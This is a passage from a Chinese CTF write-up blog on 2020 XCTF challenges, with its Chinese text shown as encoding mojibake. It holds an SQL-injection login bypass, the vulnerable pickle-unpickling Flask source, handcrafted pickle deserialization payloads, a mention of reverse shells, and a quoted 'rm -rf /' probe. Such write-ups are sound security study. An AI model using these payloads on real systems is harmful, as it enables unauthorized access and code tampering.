â€¦â€¦</p><p>ç„¶è€Œäººå®¶<code>äºŒç»´ç </code>é‡Œç»™æç¤ºäº†ï¼Œåªæ˜¯æç¤ºä¸åœ¨ç»“å°¾è€Œå·²ã€‚</p><p>å‘ï¼Œ<strong>USEBASE64TOGETYOURFLAG</strong>.</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/usebase64.png" alt="usebase64"></p><p>ä¸‹æ¬¡å¾—å…ˆç”¨ <code>strings</code> æ¥çœ‹çœ‹â€¦â€¦</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/strings_base64.png" alt="strings"></p></blockquote><p>äºæ˜¯ flag å°±æ˜¯ <code>flag{MTg3NDg1NjE4NTIx}</code>ã€‚</p><hr><p>æ‰¾èµ„æ–™çš„æ—¶å€™å‘ç°äº†æœ‰å¤§ä½¬åœ¨å•ç‰‡æœºä¸Šå®ç° DTMF è½¯è§£ç çš„ã€‚</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/dtmf_soft.png" alt="å•ç‰‡æœºè½¯è§£ç "></p><p>åœ¨çº¿ç”ŸæˆæŸç§ç‰¹å®šéŸ³è°ƒçš„ç½‘ç«™ï¼š<a href="http://onlinetonegenerator.com/dtmf.html">http://onlinetonegenerator.com/dtmf.html</a></p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/toneGenerator.png" alt="toneGenerator"></p><p>å…¶ä»–ä¸€äº›èµ„æ–™ï¼š</p><p><a href="https://www.audiocheck.net/audiocheck_dtmf.php">å¦ä¸€ä¸ªåœ¨çº¿ DTMF ç”Ÿæˆå·¥å…· DTMF Tone Generator</a></p><p><a href="http://dialabc.com/sound/detect/">ä¸€ä¸ªåœ¨çº¿ DTMF è§£ç å·¥å…· Detect DTMF Tones</a>ï¼ˆå¥½åƒä¸Šä¸å»ï¼‰</p><p><a href="https://blog.csdn.net/hankhanti/article/details/49902441">DTMF ç¼–ç åŠè§£ç </a></p><p>GitHubé¡¹ç›®ï¼š      </p><p><strong><a href="https://github.com/MeowLucian/DTMF_Detector">DTMF_Detector</a></strong>  ğŸ“ Using Matlab to simulate Dual-Tone Multi-Frequency (DTMF) of telephone        </p><p><strong><a href="https://github.com/OmaymaS/DTMF-Detection-Goertzel-Algorithm-">DTMF-Detection-Goertzel-Algorithm-</a></strong>  DTMF detection system developed on AVR Atmega128 board based on Goertzel algorithm        </p><br><hr><h3 id="æ­¦æ±‰åŠ æ²¹"><a href="#æ­¦æ±‰åŠ æ²¹" class="headerlink" title="æ­¦æ±‰åŠ æ²¹"></a>æ­¦æ±‰åŠ æ²¹</h3><p>å‘ç°é™„ä»¶åªæœ‰ä¸€å¼ å›¾ç‰‡â†“ã€‚</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/1.jpg"></p><blockquote><p>é¦–å…ˆç¥æ­¦æ±‰åŠ æ²¹ï¼Œä¸­å›½åŠ æ²¹ï¼Œå‘åŒ»æŠ¤äººå‘˜è‡´æ•¬ã€‚</p></blockquote><p>å‘ç°äº†æ–‡ä»¶æ‹¼æ¥äº†ä¸€ä¸ª RAR æ–‡ä»¶ï¼Œforemost æå–ä¸å‡ºæ¥ï¼Œæ‡’å¾—å¼€ Ubuntu ç”¨ binwalk äº†ï¼Œäºæ˜¯ç›´æ¥æ‰‹åŠ¨æå–å‡ºå‹ç¼©åŒ…ã€‚</p><p>å¾—åˆ°ä¸€ä¸ª<code>flag.exe</code>.</p><p>ä»€ä¹ˆï¼ŸMISC é¢˜è¿˜è¦ REï¼Ÿï¼Ÿï¼Ÿ</p><p>ç„¶è€Œçœ‹äº†ä¸€ä¸‹å‘ç°è§£ä¸äº†ï¼Œå¥½åƒåŠ å£³äº†ã€‚</p><p>éšä¾¿çŒœäº†ä¸€ä¸‹å’Œæ­¦æ±‰åŠ æ²¹ç›¸å…³çš„ flag äº¤ä¸Šå»ï¼Œéƒ½ä¸å¯¹â€¦â€¦</p><p>çœ‹äº†å¤§ä½¬ä»¬çš„ WP å‘ç°æ˜¯ <code>flag{zhong_guo_jia_you}</code> â€¦ ä¸­å›½åŠ æ²¹ï¼</p><p>ï¼ˆä½©æœç›´æ¥çŒœå‡ºæ¥çš„ï¼‰</p><blockquote><p>åŸæ¥å›¾ç‰‡é‡Œè¿˜éšå†™äº†å¯†ç ï¼Œç”¨ steghide çˆ†ç ´æå–å‡º <code>ï¬‚ag.txt</code>ï¼Œå¯ä»¥å¾—åˆ°å¯†ç <code>' æ­¦ æ±‰ åŠ  æ²¹ !</code>ï¼Œè¾“å…¥åˆ° <code>flag.exe</code>å°±å¯ä»¥å¾—åˆ° flagã€‚ï¼ˆemmm</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/zhongguojiayou.png" alt="zhongguojiayou"></p></blockquote><br><h3 id="ez-mem-amp-usb"><a href="#ez-mem-amp-usb" class="headerlink" title="ez_mem&amp;usb"></a>ez_mem&amp;usb</h3><p>MISC æ˜¯çœŸçš„æ‚â€¦â€¦</p><p><code>captured.pcap</code>æŠ“åŒ…æ–‡ä»¶ï¼Œå¯ä»¥åœ¨ä¸€å †æµé‡ä¸­æå–å‡ºä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„é¡µé¢<code>upload_file.php</code>ã€‚</p><p>ä»æäº¤çš„ form é‡Œå¯ä»¥æå–å‡ºä¸€ä¸ª <code>data.zip</code>.</p><p>å‹ç¼©åŒ…é‡Œæ˜¯ä¸€ä¸ª <code>data.vmem</code>ï¼Œå™«ä¸€ä¸ªè™šæ‹Ÿæœºå†…å­˜é•œåƒã€‚</p><p>æ‡µäº†ï¼Œæ²¡ç©è¿‡å†…å­˜å–è¯çš„é¢˜ç›®å”‰<em>ï¼ˆå¥½èœå•Š</em></p><p>çœ‹é¢˜ç›®åé¢åº”è¯¥è¿˜éœ€è¦æå– USB çš„æ•°æ®ï¼Œå¤§æ¦‚ flag åœ¨ USB æ•°æ®é‡Œå§ã€‚</p><p>åé¢æœ‰ç©ºå†å­¦å­¦ volatility å†…å­˜å–è¯ã€‚</p><br><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h3><blockquote><p><a href="http://121.37.161.79:8005/">http://121.37.161.79:8005</a></p></blockquote><p>å°±æ˜¯è¾“å…¥<strong>ç”¨æˆ·å</strong>å’Œ<strong>å¯†ç </strong>ç™»å½•é‚£ç§ï¼Œç”¨ PHP çš„ PDO æ¥è¿æ¥æ•°æ®åº“ã€‚ç”¨æˆ·åéœ€è¦ä¸º<code>admin</code>ã€‚</p><p>æ¯•ç«Ÿæ˜¯ checkin é¢˜ï¼Œæ„Ÿè§‰åº”è¯¥ä¸ä¼šå¤ªéš¾ã€‚ç„¶è€Œè¯•äº†è¯•å¸¸ç”¨çš„ä¸‡èƒ½å¯†ç å‘ç°å¹¶æ²¡æœ‰æ•ˆæœï¼Œéƒ½è¢« Deny äº†ã€‚</p><p>ç„¶åé˜Ÿå‹åœ¨ç½‘ä¸Šæœåˆ°äº†åŸé¢˜â€”â€” <a href="https://gksec.com/HNCTF2019-Final.html#toc-sqlsql">æ¹–å—çœç¬¬ä¸‰å±Šå¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨æ°´èµ›WriteUp</a>.</p><p><code>'-0-'</code>å¯ä»¥ä»£æ›¿<code>'or'1</code>ç»•è¿‡ã€‚äºæ˜¯æ„é€ å‚æ•°å¦‚ä¸‹å³å¯ã€‚</p><p><code>username=admin&amp;password='-0-'</code></p><blockquote><p>ç«‹ä¸ª flagï¼Œåé¢å¥½å¥½å­¦ä¸€ä¸‹ SQLï¼ˆ</p></blockquote><br><h3 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h3><blockquote><p><a href="http://121.36.222.22:10019/">http://121.36.222.22:10019/</a></p></blockquote><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/webtmp.png" alt="webtmp"></p><p>æºç ï¼š</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/webtmp_source.png" alt="source code"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> pickle<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Animal</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> category<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>category <span class="token operator">=</span> category    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Animal(name=</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>name<span class="token conversion-option punctuation">!r</span><span class="token punctuation">}</span></span><span class="token string">, category=</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>category<span class="token conversion-option punctuation">!r</span><span class="token punctuation">}</span></span><span class="token string">)'</span></span>    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> other<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">type</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span> <span class="token keyword">is</span> Animal <span class="token keyword">and</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name <span class="token keyword">and</span> self<span class="token punctuation">.</span>category <span class="token operator">==</span> other<span class="token punctuation">.</span>category    <span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">"global '%s.%s' is forbidden"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span>encoding<span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>        <span class="token keyword">return</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'source'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>read<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'text/plain'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            pickle_data <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">b'R'</span> <span class="token keyword">in</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>pickle_data<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                result <span class="token operator">=</span> restricted_loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>pickle_data<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> Animal<span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token string">'Are you sure that is an animal???'</span>            correct <span class="token operator">=</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> Animal<span class="token punctuation">(</span>secret<span class="token punctuation">.</span>name<span class="token punctuation">,</span> secret<span class="token punctuation">.</span>category<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'unpickle_result.html'</span><span class="token punctuation">,</span> result<span class="token operator">=</span>result<span class="token punctuation">,</span> pickle_data<span class="token operator">=</span>pickle_data<span class="token punctuation">,</span> giveflag<span class="token operator">=</span>correct<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">"Something wrong"</span>    sample_obj <span class="token operator">=</span> Animal<span class="token punctuation">(</span><span class="token string">'mmm'</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>       pickle_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sample_obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'unpickle_page.html'</span><span class="token punctuation">,</span> sample_obj<span class="token operator">=</span>sample_obj<span class="token punctuation">,</span> pickle_data<span class="token operator">=</span>pickle_data<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span></code></pre><p><em>ï¼ˆå¯èƒ½æœ‰äº›åœ°æ–¹è¢«æˆ‘ä¸å°å¿ƒæ”¹äº†</em></p><p>çœ‹åˆ° pickle æƒ³åˆ°äº†ååºåˆ—åŒ–ï¼Œä¹‹å‰åªå¬è¯´è¿‡ PHP æœ‰ååºåˆ—åŒ–æ¼æ´ï¼Œè¿™é‡Œæ‰çŸ¥é“åŸæ¥ python ä¹Ÿæœ‰ã€‚</p><p>è¿™æ¬¡æ­£å¥½å°±æ¥äº†è§£ä¸€ä¸‹ pickle ååºåˆ—åŒ–å§ã€‚</p><p><em>åé¢å†è®°ä¸€ä¸‹è¿™ä¸€å—çš„ç¬”è®°å§ï¼ˆå¤§æ¦‚ç‡å’•å’•å’•</em></p><p>å¯ä»¥ç”¨ <strong>pickletools è¿™ä¸ªåæ±‡ç¼–å·¥å…·</strong>æ¥å¸®åŠ©ç†è§£ pickle ä»£ç ï¼Œå³<code>opcode</code> ã€‚</p><p>æ¯”å¦‚è¿™é‡ŒæŠŠ<code>name</code>è®¾æˆ <code>'mmm'</code>ï¼Œ<code>category</code>è®¾ä¸º <code>'aaaa'</code>ï¼Œè€Œåç”Ÿæˆ pickleï¼Œå¯ä»¥çœ‹åˆ°å„ä¸ªå‘½ä»¤çš„å«ä¹‰ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ python3 -m pickletools -a ./data    <span class="token number">0</span>: <span class="token punctuation">\</span>x80 PROTO      <span class="token number">3</span>              Protocol version indicator.    <span class="token number">2</span>: c    GLOBAL     <span class="token string">'__main__ Animal'</span> Push a global object <span class="token punctuation">(</span>module.attr<span class="token punctuation">)</span> on the stack.   <span class="token number">19</span>: q    BINPUT     <span class="token number">0</span>                 Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   <span class="token number">21</span>: <span class="token punctuation">)</span>    EMPTY_TUPLE                  Push an empty tuple.   <span class="token number">22</span>: <span class="token punctuation">\</span>x81 NEWOBJ                       Build an object instance.   <span class="token number">23</span>: q    BINPUT     <span class="token number">1</span>                 Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   <span class="token number">25</span>: <span class="token punctuation">}</span>    EMPTY_DICT                   Push an empty dict.   <span class="token number">26</span>: q    BINPUT     <span class="token number">2</span>                 Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   <span class="token number">28</span>: <span class="token punctuation">(</span>    MARK                         Push markobject onto the stack.   <span class="token number">29</span>: X        BINUNICODE <span class="token string">'name'</span>        Push a Python Unicode string object.   <span class="token number">38</span>: q        BINPUT     <span class="token number">3</span>             Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   <span class="token number">40</span>: X        BINUNICODE <span class="token string">'mmm'</span>         Push a Python Unicode string object.   <span class="token number">48</span>: q        BINPUT     <span class="token number">4</span>             Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   <span class="token number">50</span>: X        BINUNICODE <span class="token string">'category'</span>    Push a Python Unicode string object.   <span class="token number">63</span>: q        BINPUT     <span class="token number">5</span>             Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   <span class="token number">65</span>: X        BINUNICODE <span class="token string">'aaaa'</span>        Push a Python Unicode string object.   <span class="token number">74</span>: q        BINPUT     <span class="token number">6</span>             Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   <span class="token number">76</span>: u        SETITEMS   <span class="token punctuation">(</span>MARK at <span class="token number">28</span><span class="token punctuation">)</span>  Add an arbitrary number of key+value pairs to an existing dict.   <span class="token number">77</span>: b    BUILD                        Finish building an object, via __setstate__ or dict update.   <span class="token number">78</span>: <span class="token builtin class-name">.</span>    STOP                         Stop the unpickling machine.highest protocol among opcodes <span class="token operator">=</span> <span class="token number">2</span></code></pre><p>çœ‹äº†åŠå¤©ååºåˆ—åŒ–æ¼æ´ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯<strong>åˆ©ç”¨<code>__reduce__</code>æ–¹æ³•æ¥å®ç°ä»»æ„ä»£ç çš„æ‰§è¡Œ</strong>ã€‚</p><p>å¦‚æœæ²¡æœ‰è¾“å‡ºçš„è¯ï¼Œå¯ä»¥åå¼¹ shell åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œåˆ©ç”¨ç½‘ç«™è®¿é—®æ—¥å¿—æ¥å¾—åˆ°éœ€è¦çš„ä¿¡æ¯ã€‚</p><p>ï¼ˆè¿™æ—¶æˆ‘çœ‹äº†çœ‹æœåŠ¡å™¨çš„ nginx logï¼Œå‘ç°æ—¥å¸¸è¢«æ‰«ï¼Œå¸¸è§çš„ adminã€phpmyadmin ç›®å½•ï¼Œç”šè‡³è¿˜æœ‰æƒ³è·¨ç«™æ‰§è¡Œ <code>rm -rf /</code> çš„â€¦â€¦ </p><p>è¯è¯´å›æ¥ï¼Œå½“æˆ‘å†™å¥½ <code>__reduce__</code> æ–¹æ³• post ä¸Šå»ä¹‹åï¼Œå‘ç°è¢«æ‹’ç»äº†ã€‚ä¸è¿‡ä»£ç é‡Œä¹Ÿæœ‰ä½“ç°ã€‚</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/webtmp_noRCE2.png" alt="no RCEs"></p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/webtmp_noRCE.png" alt="No RCE"></p><p>ç„¶è€Œæƒ³è¦å°† callable å¯¹è±¡æ‰§è¡Œéƒ½å¿…é¡»è¦è°ƒç”¨ <code>reduce</code>ï¼Œåœ¨ pickle ä¸­éƒ½ä¼šæ¶‰åŠ <code>R</code> è¿™ä¸ªå­—æ¯ã€‚</p><p>äºæ˜¯ä¹ä¸èƒ½åœ¨æœåŠ¡å™¨ä¸Šé€šè¿‡æ‰§è¡Œè‡ªå·±çš„ä»£ç æ¥è·å– flagã€‚</p><p>åé¢çªç„¶æƒ³åˆ°ï¼Œä½ ä¸è®©æˆ‘ RCEï¼Œæˆ‘å¯ä»¥<strong>æ”¹æ‰ä½ çš„ <code>secret</code> ä¸­çš„ <code>name</code> å’Œ <code>category</code></strong> å•Šï¼</p><p>è¿™é‡Œè¦æ‰‹æ“ pickle äº†ã€‚å½“æ—¶çš„æ€è·¯æ˜¯<strong>è°ƒç”¨ <code>secret</code> æ¨¡å—çš„å†…å®¹å¯¹ Animal è¿›è¡Œå®ä¾‹åŒ–</strong>ã€‚ç„¶è€Œæ¯”è¾ƒèœï¼Œä¸çŸ¥é“ä¸ºå•¥å‡ºäº†ç‚¹é—®é¢˜ã€‚</p><p>åæ¥åˆæƒ³åˆ°<strong>è¯»å– secret æ–‡ä»¶è¯»å–å±æ€§ä¿¡æ¯è¿›è€Œè·å– flag</strong>ï¼Œä¸è¿‡æ²¡æœ‰å…·ä½“çš„æ€è·¯ï¼Œäºæ˜¯åˆ°è¿™é‡Œå°±å¡ä½äº†ã€‚</p><blockquote><p>åæ¥çœ‹åˆ°å¤§ä½¬çš„ WPï¼Œå‘ç°æœç„¶æ˜¯**ç›´æ¥æ”¹æ‰è¿™ä¸ª<code>secret</code>**ã€‚</p><p>ä¸è¿‡å…·ä½“ä¸æ˜¯è°ƒç”¨ <code>secret</code> æ¨¡å—ï¼Œè€Œæ˜¯ç›´æ¥åœ¨ <code>__main__</code> ä¸‹å»ºä¸€ä¸ªè‡ªå·±çš„<code>secret</code>ç±»ï¼Œè®¾ç½®è‡ªå·±çš„å±æ€§ï¼Œè¦†ç›–æ‰ import è¿›æ¥çš„<code>secret</code>ã€‚å†åˆ©ç”¨è‡ªå·±è®¾ç½®çš„å±æ€§ä¿¡æ¯å»æ ¡éªŒå°±å®Œäº‹äº†ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b"\x80\x03c__main__\nsecret\n} (X\x04\x00\x00\x00nameX\x03\x00\x00\x00233X\x08\x00\x00\x00categoryX\x03\x00\x 00\x00233ub0c__main__\nAnimal\n)\x81} (X\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00233X\x08\x00\x00\x00categoryX\x03\ x00\x00\x00233ub."</span></code></pre><p>å¦ä¸€ä¸ª payloadï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token string">b"c__main__\nsecret\np0\n0g0\n(}(S'name'\nS'asd'\ndtbg0\n(}(S'category'\nS'123'\ndtb\x80\x04\x95=\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Animal\x94\x93\x94)\x81\x94}\x94(\x8c\x04name\x94\x8c\x03asd\x94\x8c\x08category\x94\x8c\x03123\x94ub."</span><span class="token comment"># base64</span>Y19fbWFpbl9fCnNlY3JldApwMAowZzAKKH0oUyduYW1lJwpTJ2FzZCcKZHRiZzAKKH0oUydjYXRlZ29yeScKUycxMjMnCmR0YoAElT0AAAAAAAAAjAhfX21haW5fX5SMBkFuaW1hbJSTlCmBlH2UKIwEbmFtZZSMA2FzZJSMCGNhdGVnb3J5lIwDMTIzlHViLg<span class="token operator">==</span></code></pre><p><strong>ä¸‹é¢è¿™ä¸ªé“¾æ¥é‡Œæœ‰å…³äº pickle åŠå…¶ååºåˆ—åŒ–æ¼æ´çš„æ›´å®Œæ•´çš„ä»‹ç»ã€‚</strong></p></blockquote><p><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX#"><span class="github-emoji"><span>ğŸ</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f40d.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> Security Issues in Python Pickle</a></p><p><em>ï¼ˆScientific Network needed</em></p><blockquote><p>What is serialization, How to serialize data, Pickle in CTF Challenges, Implementation of Pickle, Vulnerabilities in Wild, Mitigation strategies &amp;&amp; Best practicesâ€¦</p></blockquote><blockquote><p>é‡Œé¢è®²åˆ°äº†å‡ ä¸ªä¾‹é¢˜</p><p><a href="http://web.hitctf.cn:10018/">2019-SJTU-Pickle</a><br><a href="http://web.hitctf.cn:10018/">2019-SJTU-Pickle-Revenge-Back</a><br><a href="http://web.hitctf.cn:10020/">2018-HITB-Python-Revenge</a><br><a href="http://web.hitctf.cn:10019/">2019-SJTU-Pickle-Revenge</a>   ï¼ˆâ†è¿™ä¸ªé¢˜å°±å’Œè¿™é‡Œè¿™é¢˜å‡ ä¹ä¸€ä¸ªå¥—è·¯</p></blockquote><p>ä¸å…è®¸<code>R</code>ï¼Œä»–è¿™é‡Œçš„æ³¨å…¥æ€è·¯ä¹Ÿæ˜¯è°ƒç”¨ <code>secret</code> æ¨¡å—çš„å†…å®¹å¯¹ Animal è¿›è¡Œå®ä¾‹åŒ–ï¼Œæœ‰ç‚¹æƒ³ä¸æ˜ç™½æˆ‘å†™çš„å“ªé‡Œå‡ºé—®é¢˜äº†ï¼ˆ</p><p>ä»–è¿˜è¿›ä¸€æ­¥å®ç°äº†å¯¹æ–‡ä»¶çš„è¯»å–ã€‚æœ€åçš„ç»“è®ºæ˜¯ï¼Œæ”¾å¼ƒä½¿ç”¨<code>pickle</code>ã€‚æ¯•ç«Ÿå¤ªå±é™©äº†å‘€ï¼</p><blockquote><p><strong>Extensive Reading:</strong></p><ul><li><p><a href="https://zhuanlan.zhihu.com/p/25981037">Python Pickleçš„ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´å®è·µå’ŒPayloadæ„é€ </a></p></li><li><p><a href="http://blog.nsfocus.net/%e7%bb%95%e8%bf%87-restrictedunpickler/">ç»•è¿‡ RestrictedUnpickler</a></p></li><li><p> <a href="http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/">Pythonååºåˆ—åŒ–æ¼æ´çš„èŠ±å¼åˆ©ç”¨</a></p></li><li><p> <a href="http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">å…³äºPython secçš„ä¸€äº›ç®€å•çš„æ€»ç»“</a></p></li></ul></blockquote><br><h2 id="Else"><a href="#Else" class="headerlink" title="Else"></a>Else</h2><p>å…¶ä»–çš„é¢˜å¤§æ¦‚çœ‹äº†çœ‹ã€‚ã€‚ä¸è¿‡æ²¡ä»€ä¹ˆæ€è·¯æˆ–è€…æœ‰æ€è·¯ä¸çŸ¥é“æ€ä¹ˆå®ç°ï¼Œå¥½èœå•Šâ€¦â€¦</p><p>ï¼ˆæ€ä¹ˆå¤§ä½¬ä»¬åŠ¨ä¸åŠ¨éšæ‰‹å°±ä¸€ä¸ª payload æå®šäº†å˜¤å˜¤å˜¤</p><br><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å†å›è¿‡å¤´æ¥çœ‹è¿™æ¬¡ CTF çš„æ¯”èµ›åç§°ï¼Œ<strong>é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›</strong>ã€‚</p><p>è¿˜æ˜¯æŒºæœ‰æ„æ€çš„å§ã€‚ä¸»é¢˜ç»“åˆäº†å½“ä¸‹çš„çƒ­ç‚¹ï¼Œé¢˜ç›®ä¹Ÿæ¯”è¾ƒåº”æ™¯ï¼Œä¹ŸæŒºæ­£èƒ½é‡çš„ã€‚</p><p>COVID-19 